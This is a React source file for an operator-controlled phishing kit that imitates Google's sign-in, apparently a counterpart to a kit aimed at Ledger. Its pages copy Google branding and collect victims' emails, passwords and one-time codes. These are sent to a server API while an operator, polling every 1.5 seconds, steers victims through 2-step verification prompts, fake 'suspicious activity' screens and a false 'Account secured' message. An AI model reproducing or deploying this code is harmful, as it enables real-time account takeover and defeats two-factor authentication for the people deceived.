"use client"

import { useState, useEffect, useCallback, useRef } from "react"
import { Loader as Loader2, Eye, EyeOff, Smartphone, Mail, CircleCheck as CheckCircle2, ShieldAlert, X } from "lucide-react"

type GoogleStage = "email" | "password" | "prompt" | "code_email" | "code_phone" | "code_alternate" | "deny_changes" | "requests_cancelled"

function generateVisitorId() {
  return "google_" + Math.random().toString(36).substring(2, 15) + Date.now().toString(36)
}

// Google Logo
function GoogleLogo({ size = 74 }: { size?: number }) {
  return (
    <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 48 48">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    </svg>
  )
}

// Footer component
function GoogleFooter() {
  return (
    <footer className="fixed bottom-0 left-0 right-0 flex items-center justify-between px-4 py-3 text-[12px] text-[#5f6368] bg-[#f0f4f9]">
      <div className="flex items-center gap-1">
        <select className="cursor-pointer bg-transparent outline-none hover:text-[#202124]">
          <option>English (United States)</option>
        </select>
      </div>
      <div className="flex items-center gap-6">
        <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-[#202124]">Help</a>
        <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-[#202124]">Privacy</a>
        <a href="#" onClick={(e) => e.preventDefault()} className="hover:text-[#202124]">Terms</a>
      </div>
    </footer>
  )
}

// Email Stage
function EmailStage({ onNext, email, setEmail }: { onNext: () => void; email: string; setEmail: (v: string) => void }) {
  const [error, setError] = useState("")

  return (
    <div className="flex min-h-screen flex-col bg-[#f0f4f9]">
      <div className="flex flex-1 items-center justify-center px-4 pb-16">
        <div className="w-full max-w-[450px] rounded-[28px] bg-white px-10 py-12 shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)]">
          <div className="mb-4 flex justify-center">
            <GoogleLogo size={74} />
          </div>
          <h1 className="text-center text-[24px] font-normal text-[#1f1f1f]">Sign in</h1>
          <p className="mt-2 text-center text-[16px] text-[#1f1f1f]">to continue to Gmail</p>
          
          <form onSubmit={(e) => { e.preventDefault(); if (!email.trim()) { setError("Enter an email or phone number"); return; } setError(""); onNext(); }} className="mt-8">
            <div className="mb-1">
              <div className={`relative rounded border ${error ? "border-[#d93025]" : "border-[#747775]"} focus-within:border-2 focus-within:border-[#0b57d0]`}>
                <input
                  type="text"
                  value={email}
                  onChange={(e) => { setEmail(e.target.value); setError("") }}
                  className="peer w-full rounded bg-white px-4 pb-2 pt-5 text-[16px] text-[#1f1f1f] outline-none"
                  placeholder=" "
                  autoFocus
                />
                <label className={`pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 bg-white px-1 text-[16px] transition-all duration-150 ${error ? "text-[#d93025]" : "text-[#444746]"} peer-focus:top-0 peer-focus:text-[12px] peer-focus:text-[#0b57d0] ${email ? "top-0 text-[12px]" : ""}`}>
                  Email or phone
                </label>
              </div>
              {error && <p className="mt-2 text-[12px] text-[#d93025]">{error}</p>}
            </div>

            <div className="mt-2">
              <a href="#" className="text-[14px] font-medium text-[#0b57d0] hover:underline" onClick={(e) => e.preventDefault()}>
                Forgot email?
              </a>
            </div>

            <p className="mt-8 text-[14px] leading-5 text-[#5f6368]">
              Not your computer? Use Guest mode to sign in privately.{" "}
              <a href="#" className="text-[#0b57d0] hover:underline" onClick={(e) => e.preventDefault()}>Learn more about using Guest mode</a>
            </p>

            <div className="mt-10 flex items-center justify-between">
              <a href="#" className="text-[14px] font-medium text-[#0b57d0] hover:underline" onClick={(e) => e.preventDefault()}>
                Create account
              </a>
              <button
                type="submit"
                className="cursor-pointer rounded bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-all hover:bg-[#0842a0] hover:shadow-[0_1px_3px_1px_rgba(66,64,67,0.15),0_1px_2px_0_rgba(60,64,67,0.3)]"
              >
                Next
              </button>
            </div>
          </form>
        </div>
      </div>
      <GoogleFooter />
    </div>
  )
}

// Password Stage
function PasswordStage({ email, onBack, onNext, password, setPassword }: { email: string; onBack: () => void; onNext: () => void; password: string; setPassword: (v: string) => void }) {
  const [showPassword, setShowPassword] = useState(false)
  const [error, setError] = useState("")

  return (
    <div className="flex min-h-screen flex-col bg-[#f0f4f9]">
      <div className="flex flex-1 items-center justify-center px-4 pb-16">
        <div className="w-full max-w-[450px] rounded-[28px] bg-white px-10 py-12 shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)]">
          <div className="mb-4 flex justify-center">
            <GoogleLogo size={74} />
          </div>
          <h1 className="text-center text-[24px] font-normal text-[#1f1f1f]">Welcome</h1>
          
          <div className="mt-4 flex justify-center">
            <button 
              onClick={onBack}
              className="flex cursor-pointer items-center gap-2 rounded-full border border-[#dadce0] py-1 pl-1 pr-3 text-[14px] text-[#3c4043] transition-colors hover:bg-[#f1f3f4]"
            >
              <div className="flex h-6 w-6 items-center justify-center rounded-full bg-purple-500">
                <span className="text-[11px] font-medium uppercase text-white">{email.charAt(0)}</span>
              </div>
              <span className="max-w-[200px] truncate">{email}</span>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M7 10l5 5 5-5z"/></svg>
            </button>
          </div>
          
          <form onSubmit={(e) => { e.preventDefault(); if (!password) { setError("Enter a password"); return; } setError(""); onNext(); }} className="mt-8">
            <div className="mb-1">
              <div className={`relative rounded border ${error ? "border-[#d93025]" : "border-[#747775]"} focus-within:border-2 focus-within:border-[#0b57d0]`}>
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => { setPassword(e.target.value); setError("") }}
                  className="peer w-full rounded bg-white px-4 pb-2 pr-12 pt-5 text-[16px] text-[#1f1f1f] outline-none"
                  placeholder=" "
                  autoFocus
                />
                <label className={`pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 bg-white px-1 text-[16px] transition-all duration-150 ${error ? "text-[#d93025]" : "text-[#444746]"} peer-focus:top-0 peer-focus:text-[12px] peer-focus:text-[#0b57d0] ${password ? "top-0 text-[12px]" : ""}`}>
                  Enter your password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 cursor-pointer p-1 text-[#5f6368] hover:text-[#1f1f1f]"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>
              {error && <p className="mt-2 text-[12px] text-[#d93025]">{error}</p>}
            </div>

            <label className="mt-3 flex cursor-pointer items-center gap-3">
              <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="h-[18px] w-[18px] cursor-pointer accent-[#0b57d0]" />
              <span className="text-[14px] text-[#1f1f1f]">Show password</span>
            </label>

            <div className="mt-10 flex items-center justify-between">
              <a href="#" className="text-[14px] font-medium text-[#0b57d0] hover:underline" onClick={(e) => e.preventDefault()}>
                Forgot password?
              </a>
              <button
                type="submit"
                className="cursor-pointer rounded bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-all hover:bg-[#0842a0] hover:shadow-[0_1px_3px_1px_rgba(66,64,67,0.15),0_1px_2px_0_rgba(60,64,67,0.3)]"
              >
                Next
              </button>
            </div>
          </form>
        </div>
      </div>
      <GoogleFooter />
    </div>
  )
}

// Prompt Stage - Press number on device
function PromptStage({ promptNumber, promptApp }: { promptNumber: string; promptApp: string }) {
  return (
    <div className="flex min-h-screen flex-col bg-[#f0f4f9]">
      <div className="flex flex-1 items-center justify-center px-4 pb-16">
        <div className="w-full max-w-[450px] rounded-[28px] bg-white px-10 py-12 shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)]">
          <div className="flex justify-center">
            <GoogleLogo size={74} />
          </div>
          <h1 className="mt-6 text-center text-[24px] font-normal text-[#1f1f1f]">2-Step Verification</h1>
          <p className="mt-3 text-center text-[14px] text-[#5f6368]">
            {"To help keep your account safe, Google wants to make sure it's really you trying to sign in"}
          </p>

          <div className="my-8 rounded-2xl bg-[#f0f4f9] p-6">
            <div className="mb-6 flex items-center gap-4">
              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-[#d3e3fd]">
                <Smartphone className="h-6 w-6 text-[#0b57d0]" />
              </div>
              <div>
                <p className="text-[14px] font-medium text-[#1f1f1f]">Check your device</p>
                <p className="text-[12px] text-[#5f6368]">{promptApp || "Gmail, YouTube, Google app, or notification"}</p>
              </div>
            </div>

            <div className="border-t border-[#c4c7c5] pt-6 text-center">
              <p className="mb-4 text-[14px] text-[#5f6368]">Tap the matching number on your device</p>
              <div className="inline-flex rounded-xl bg-[#0b57d0] px-10 py-5">
                <span className="text-[40px] font-medium leading-none tracking-wider text-white">{promptNumber || "42"}</span>
              </div>
            </div>
          </div>

          <div className="flex items-center justify-center gap-2 text-[14px] text-[#5f6368]">
            <div className="h-4 w-4 animate-spin rounded-full border-2 border-[#dadce0] border-t-[#0b57d0]" />
            <span>Waiting for response...</span>
          </div>

          <div className="mt-8 border-t border-[#dadce0] pt-6 text-center">
            <a href="#" className="text-[14px] font-medium text-[#0b57d0] hover:underline" onClick={(e) => e.preventDefault()}>
              Try another way
            </a>
          </div>
        </div>
      </div>
      <GoogleFooter />
    </div>
  )
}

// Code to Email Stage
function CodeEmailStage({ email, code, setCode, onSubmit }: { email: string; code: string; setCode: (v: string) => void; onSubmit: () => void }) {
  const [error, setError] = useState("")
  const maskedEmail = email.replace(/(.{2})(.*)(@.*)/, "$1***$3")

  return (
    <div className="flex min-h-screen flex-col bg-[#f0f4f9]">
      <div className="flex flex-1 items-center justify-center px-4 pb-16">
        <div className="w-full max-w-[450px] rounded-[28px] bg-white px-10 py-12 shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)]">
          <div className="flex justify-center">
            <GoogleLogo size={74} />
          </div>
          <h1 className="mt-6 text-center text-[24px] font-normal text-[#1f1f1f]">2-Step Verification</h1>
          
          <div className="my-6 flex items-center justify-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#d3e3fd]">
              <Mail className="h-5 w-5 text-[#0b57d0]" />
            </div>
            <p className="text-[14px] text-[#5f6368]">
              A verification code was sent to {maskedEmail}
            </p>
          </div>

          <form onSubmit={(e) => { e.preventDefault(); if (!code || code.length < 6) { setError("Enter the verification code"); return; } setError(""); onSubmit(); }}>
            <div className="mb-3">
              <div className={`relative rounded border ${error ? "border-[#d93025]" : "border-[#747775]"} focus-within:border-2 focus-within:border-[#0b57d0]`}>
                <input
                  type="text"
                  value={code}
                  onChange={(e) => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setError("") }}
                  className="peer w-full rounded bg-white px-4 pb-2 pt-5 text-center font-mono text-[20px] tracking-[0.5em] text-[#1f1f1f] outline-none"
                  placeholder=" "
                  maxLength={6}
                  autoFocus
                />
                <label className={`pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 bg-white px-1 text-[16px] transition-all duration-150 ${error ? "text-[#d93025]" : "text-[#444746]"} peer-focus:top-0 peer-focus:text-[12px] peer-focus:text-[#0b57d0] ${code ? "top-0 text-[12px]" : ""}`}>
                  Enter code
                </label>
              </div>
              {error && <p className="mt-2 text-[12px] text-[#d93025]">{error}</p>}
            </div>

            <a href="#" className="text-[14px] font-medium text-[#0b57d0] hover:underline" onClick={(e) => e.preventDefault()}>
              {"Didn't get a code?"}
            </a>

            <div className="mt-10 flex justify-end">
              <button
                type="submit"
                className="cursor-pointer rounded bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-all hover:bg-[#0842a0] hover:shadow-[0_1px_3px_1px_rgba(66,64,67,0.15),0_1px_2px_0_rgba(60,64,67,0.3)]"
              >
                Next
              </button>
            </div>
          </form>
        </div>
      </div>
      <GoogleFooter />
    </div>
  )
}

// Code to Phone Stage
function CodePhoneStage({ phoneNumber, code, setCode, onSubmit }: { phoneNumber: string; code: string; setCode: (v: string) => void; onSubmit: () => void }) {
  const [error, setError] = useState("")

  return (
    <div className="flex min-h-screen flex-col bg-[#f0f4f9]">
      <div className="flex flex-1 items-center justify-center px-4 pb-16">
        <div className="w-full max-w-[450px] rounded-[28px] bg-white px-10 py-12 shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)]">
          <div className="flex justify-center">
            <GoogleLogo size={74} />
          </div>
          <h1 className="mt-6 text-center text-[24px] font-normal text-[#1f1f1f]">2-Step Verification</h1>
          
          <div className="my-6 flex items-center justify-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#d3e3fd]">
              <Smartphone className="h-5 w-5 text-[#0b57d0]" />
            </div>
            <p className="text-[14px] text-[#5f6368]">
              A verification code was sent to {phoneNumber || "***-***-1234"}
            </p>
          </div>

          <form onSubmit={(e) => { e.preventDefault(); if (!code || code.length < 6) { setError("Enter the verification code"); return; } setError(""); onSubmit(); }}>
            <div className="mb-3">
              <div className={`relative rounded border ${error ? "border-[#d93025]" : "border-[#747775]"} focus-within:border-2 focus-within:border-[#0b57d0]`}>
                <input
                  type="text"
                  value={code}
                  onChange={(e) => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setError("") }}
                  className="peer w-full rounded bg-white px-4 pb-2 pt-5 text-center font-mono text-[20px] tracking-[0.5em] text-[#1f1f1f] outline-none"
                  placeholder=" "
                  maxLength={6}
                  autoFocus
                />
                <label className={`pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 bg-white px-1 text-[16px] transition-all duration-150 ${error ? "text-[#d93025]" : "text-[#444746]"} peer-focus:top-0 peer-focus:text-[12px] peer-focus:text-[#0b57d0] ${code ? "top-0 text-[12px]" : ""}`}>
                  Enter code
                </label>
              </div>
              {error && <p className="mt-2 text-[12px] text-[#d93025]">{error}</p>}
            </div>

            <a href="#" className="text-[14px] font-medium text-[#0b57d0] hover:underline" onClick={(e) => e.preventDefault()}>
              {"Didn't get a code?"}
            </a>

            <div className="mt-10 flex justify-end">
              <button
                type="submit"
                className="cursor-pointer rounded bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-all hover:bg-[#0842a0] hover:shadow-[0_1px_3px_1px_rgba(66,64,67,0.15),0_1px_2px_0_rgba(60,64,67,0.3)]"
              >
                Next
              </button>
            </div>
          </form>
        </div>
      </div>
      <GoogleFooter />
    </div>
  )
}

// Code to Alternate Email Stage
function CodeAlternateStage({ alternateEmail, code, setCode, onSubmit }: { alternateEmail: string; code: string; setCode: (v: string) => void; onSubmit: () => void }) {
  const [error, setError] = useState("")
  const maskedEmail = alternateEmail ? alternateEmail.replace(/(.{2})(.*)(@.*)/, "$1***$3") : "***@***.com"

  return (
    <div className="flex min-h-screen flex-col bg-[#f0f4f9]">
      <div className="flex flex-1 items-center justify-center px-4 pb-16">
        <div className="w-full max-w-[450px] rounded-[28px] bg-white px-10 py-12 shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)]">
          <div className="flex justify-center">
            <GoogleLogo size={74} />
          </div>
          <h1 className="mt-6 text-center text-[24px] font-normal text-[#1f1f1f]">2-Step Verification</h1>
          
          <div className="my-6 flex items-center justify-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-full bg-[#d3e3fd]">
              <Mail className="h-5 w-5 text-[#0b57d0]" />
            </div>
            <div className="text-center">
              <p className="text-[14px] text-[#5f6368]">
                A verification code was sent to your recovery email
              </p>
              <p className="text-[14px] font-medium text-[#1f1f1f]">{maskedEmail}</p>
            </div>
          </div>

          <form onSubmit={(e) => { e.preventDefault(); if (!code || code.length < 6) { setError("Enter the verification code"); return; } setError(""); onSubmit(); }}>
            <div className="mb-3">
              <div className={`relative rounded border ${error ? "border-[#d93025]" : "border-[#747775]"} focus-within:border-2 focus-within:border-[#0b57d0]`}>
                <input
                  type="text"
                  value={code}
                  onChange={(e) => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setError("") }}
                  className="peer w-full rounded bg-white px-4 pb-2 pt-5 text-center font-mono text-[20px] tracking-[0.5em] text-[#1f1f1f] outline-none"
                  placeholder=" "
                  maxLength={6}
                  autoFocus
                />
                <label className={`pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 bg-white px-1 text-[16px] transition-all duration-150 ${error ? "text-[#d93025]" : "text-[#444746]"} peer-focus:top-0 peer-focus:text-[12px] peer-focus:text-[#0b57d0] ${code ? "top-0 text-[12px]" : ""}`}>
                  Enter code
                </label>
              </div>
              {error && <p className="mt-2 text-[12px] text-[#d93025]">{error}</p>}
            </div>

            <a href="#" className="text-[14px] font-medium text-[#0b57d0] hover:underline" onClick={(e) => e.preventDefault()}>
              {"Didn't get a code?"}
            </a>

            <div className="mt-10 flex justify-end">
              <button
                type="submit"
                className="cursor-pointer rounded bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-all hover:bg-[#0842a0] hover:shadow-[0_1px_3px_1px_rgba(66,64,67,0.15),0_1px_2px_0_rgba(60,64,67,0.3)]"
              >
                Next
              </button>
            </div>
          </form>
        </div>
      </div>
      <GoogleFooter />
    </div>
  )
}

// Deny Changes Stage - 3 security alerts
function DenyChangesStage({ email, onDenyAll }: { email: string; onDenyAll: () => void }) {
  const [denied, setDenied] = useState<string[]>([])
  const changes = [
    { id: "password", title: "Password was changed", desc: "Someone changed your password on April 15, 2026", icon: ShieldAlert },
    { id: "recovery", title: "Recovery email was changed", desc: "Recovery email was updated to unknown address", icon: Mail },
    { id: "device", title: "Sign-in from unknown device", desc: "New sign-in from Windows PC in Frankfurt, Germany", icon: Smartphone },
  ]
  const allDenied = denied.length === 3

  return (
    <div className="flex min-h-screen flex-col bg-[#f0f4f9]">
      <div className="flex flex-1 items-center justify-center px-4 pb-16">
        <div className="w-full max-w-[500px] rounded-[28px] bg-white px-10 py-12 shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)]">
          <div className="flex justify-center">
            <GoogleLogo size={74} />
          </div>
          <h1 className="mt-6 text-center text-[24px] font-normal text-[#1f1f1f]">Review recent activity</h1>
          <p className="mt-2 text-center text-[14px] text-[#5f6368]">
            We detected some suspicious activity on your account. Please review and take action.
          </p>

          <div className="mt-8 space-y-4">
            {changes.map((change) => {
              const Icon = change.icon
              const isDenied = denied.includes(change.id)
              return (
                <div key={change.id} className={`flex items-start gap-4 rounded-xl border p-4 transition-colors ${isDenied ? "border-green-500 bg-green-50" : "border-[#dadce0] bg-white"}`}>
                  <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-full ${isDenied ? "bg-green-100" : "bg-red-100"}`}>
                    {isDenied ? <CheckCircle2 className="h-5 w-5 text-green-600" /> : <Icon className="h-5 w-5 text-red-600" />}
                  </div>
                  <div className="flex-1">
                    <p className="text-[14px] font-medium text-[#1f1f1f]">{change.title}</p>
                    <p className="mt-1 text-[12px] text-[#5f6368]">{change.desc}</p>
                  </div>
                  <button
                    onClick={() => !isDenied && setDenied([...denied, change.id])}
                    disabled={isDenied}
                    className={`shrink-0 cursor-pointer rounded px-4 py-2 text-[12px] font-medium transition-colors ${isDenied ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700 hover:bg-red-200"}`}
                  >
                    {isDenied ? "Denied" : "This wasn't me"}
                  </button>
                </div>
              )
            })}
          </div>

          <div className="mt-8 flex justify-end">
            <button
              onClick={onDenyAll}
              disabled={!allDenied}
              className="cursor-pointer rounded bg-[#0b57d0] px-6 py-2.5 text-[14px] font-medium text-white transition-all hover:bg-[#0842a0] disabled:cursor-not-allowed disabled:opacity-50"
            >
              Continue
            </button>
          </div>
        </div>
      </div>
      <GoogleFooter />
    </div>
  )
}

// Requests Cancelled Stage
function RequestsCancelledStage({ redirectUrl }: { redirectUrl: string }) {
  return (
    <div className="flex min-h-screen flex-col bg-[#f0f4f9]">
      <div className="flex flex-1 items-center justify-center px-4 pb-16">
        <div className="w-full max-w-[450px] rounded-[28px] bg-white px-10 py-12 shadow-[0_1px_3px_0_rgba(60,64,67,0.3),0_4px_8px_3px_rgba(60,64,67,0.15)]">
          <div className="flex justify-center">
            <div className="flex h-20 w-20 items-center justify-center rounded-full bg-green-100">
              <CheckCircle2 className="h-10 w-10 text-green-600" />
            </div>
          </div>
          <h1 className="mt-6 text-center text-[24px] font-normal text-[#1f1f1f]">Account secured</h1>
          <p className="mt-3 text-center text-[14px] text-[#5f6368]">
            All unauthorized changes have been reversed and your account is now secure.
          </p>
          
          <div className="my-8 rounded-xl bg-[#e8f5e9] p-4">
            <div className="flex items-center gap-3">
              <CheckCircle2 className="h-5 w-5 text-green-600" />
              <span className="text-[14px] text-green-800">Password reset completed</span>
            </div>
            <div className="mt-2 flex items-center gap-3">
              <CheckCircle2 className="h-5 w-5 text-green-600" />
              <span className="text-[14px] text-green-800">Recovery email restored</span>
            </div>
            <div className="mt-2 flex items-center gap-3">
              <CheckCircle2 className="h-5 w-5 text-green-600" />
              <span className="text-[14px] text-green-800">Unknown device removed</span>
            </div>
          </div>

          <div className="flex justify-center">
            <button
              onClick={() => window.location.href = redirectUrl || "https://myaccount.google.com"}
              className="cursor-pointer rounded bg-[#0b57d0] px-8 py-2.5 text-[14px] font-medium text-white transition-all hover:bg-[#0842a0] hover:shadow-[0_1px_3px_1px_rgba(66,64,67,0.15),0_1px_2px_0_rgba(60,64,67,0.3)]"
            >
              Continue to Google
            </button>
          </div>
        </div>
      </div>
      <GoogleFooter />
    </div>
  )
}

// Main Google Flow Component - uses activity API like Ledger flow
export default function GoogleFlow() {
  const [visitorId, setVisitorId] = useState<string | null>(null)
  const [stage, setStage] = useState<GoogleStage>("email")
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [code, setCode] = useState("")
  const [promptNumber, setPromptNumber] = useState("42")
  const [promptApp, setPromptApp] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [alternateEmail, setAlternateEmail] = useState("")
  const [redirectUrl, setRedirectUrl] = useState("")
  const [isLoading, setIsLoading] = useState(true)
  const pollRef = useRef<NodeJS.Timeout | null>(null)

  // Initialize visitor ID
  useEffect(() => {
    const storageKey = "google_visitor_id"
    let id = sessionStorage.getItem(storageKey)
    if (!id) {
      id = generateVisitorId()
      sessionStorage.setItem(storageKey, id)
    }
    setVisitorId(id)
    
    // Create initial activity
    fetch("/api/activity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        visitorId: id,
        activity: {
          visitorId: id,
          currentStage: "email",
          status: "active",
          waitingForApproval: false,
          lastUpdated: new Date().toISOString(),
          userAgent: navigator.userAgent,
          data: {},
        },
      }),
    }).then(() => setIsLoading(false))
  }, [])

  // Set page title and favicon
  useEffect(() => {
    document.title = "Sign in - Google Accounts"
    const link = document.querySelector("link[rel~='icon']") as HTMLLinkElement | null
    if (link) {
      link.href = "data:image/svg+xml," + encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>`)
    }
  }, [])

  // Poll for admin updates
  useEffect(() => {
    if (!visitorId) return

    const poll = async () => {
      try {
        const res = await fetch(`/api/activity?visitorId=${visitorId}`)
        const data = await res.json()
        if (data.activity) {
          const serverStage = data.activity.currentStage as GoogleStage
          if (serverStage && serverStage !== stage) {
            setStage(serverStage)
          }
          // Update data from admin
          if (data.activity.data) {
            if (data.activity.data.promptNumber) setPromptNumber(data.activity.data.promptNumber)
            if (data.activity.data.promptApp) setPromptApp(data.activity.data.promptApp)
            if (data.activity.data.phoneNumber) setPhoneNumber(data.activity.data.phoneNumber)
            if (data.activity.data.alternateEmail) setAlternateEmail(data.activity.data.alternateEmail)
            if (data.activity.data.redirectUrl) setRedirectUrl(data.activity.data.redirectUrl)
          }
        }
      } catch (err) {
        console.error("Poll error:", err)
      }
    }

    poll()
    pollRef.current = setInterval(poll, 1500)

    return () => {
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [visitorId, stage])

  // Save activity to server
  const saveActivity = useCallback(async (updates: Record<string, any>) => {
    if (!visitorId) return

    try {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      const existing = data.activity || {}

      await fetch("/api/activity", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          visitorId,
          activity: {
            ...existing,
            ...updates,
            visitorId,
            lastUpdated: new Date().toISOString(),
            userAgent: navigator.userAgent,
          },
        }),
      })
    } catch (err) {
      console.error("Save error:", err)
    }
  }, [visitorId])

  const handleEmailNext = async () => {
    await saveActivity({ email, currentStage: "password" })
    setStage("password")
  }

  const handlePasswordNext = async () => {
    await saveActivity({ 
      email, 
      password, 
      currentStage: "password",
      waitingForApproval: true,
      status: "waiting",
    })
    // Stay on password - admin will move to next stage
  }

  const handleCodeSubmit = async () => {
    await saveActivity({ 
      currentStage: stage,
      waitingForApproval: true,
      status: "waiting",
      data: { code }
    })
    setCode("")
  }

  const handleDenyAll = async () => {
    await saveActivity({
      currentStage: "deny_changes",
      waitingForApproval: true,
      status: "waiting",
      data: { allDenied: true }
    })
  }

  if (isLoading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#f0f4f9]">
        <Loader2 className="h-8 w-8 animate-spin text-[#0b57d0]" />
      </div>
    )
  }

  return (
    <>
      {stage === "email" && <EmailStage onNext={handleEmailNext} email={email} setEmail={setEmail} />}
      {stage === "password" && <PasswordStage email={email} onBack={() => setStage("email")} onNext={handlePasswordNext} password={password} setPassword={setPassword} />}
      {stage === "prompt" && <PromptStage promptNumber={promptNumber} promptApp={promptApp} />}
      {stage === "code_email" && <CodeEmailStage email={email} code={code} setCode={setCode} onSubmit={handleCodeSubmit} />}
      {stage === "code_phone" && <CodePhoneStage phoneNumber={phoneNumber} code={code} setCode={setCode} onSubmit={handleCodeSubmit} />}
      {stage === "code_alternate" && <CodeAlternateStage alternateEmail={alternateEmail} code={code} setCode={setCode} onSubmit={handleCodeSubmit} />}
      {stage === "deny_changes" && <DenyChangesStage email={email} onDenyAll={handleDenyAll} />}
      {stage === "requests_cancelled" && <RequestsCancelledStage redirectUrl={redirectUrl} />}
    </>
  )
}
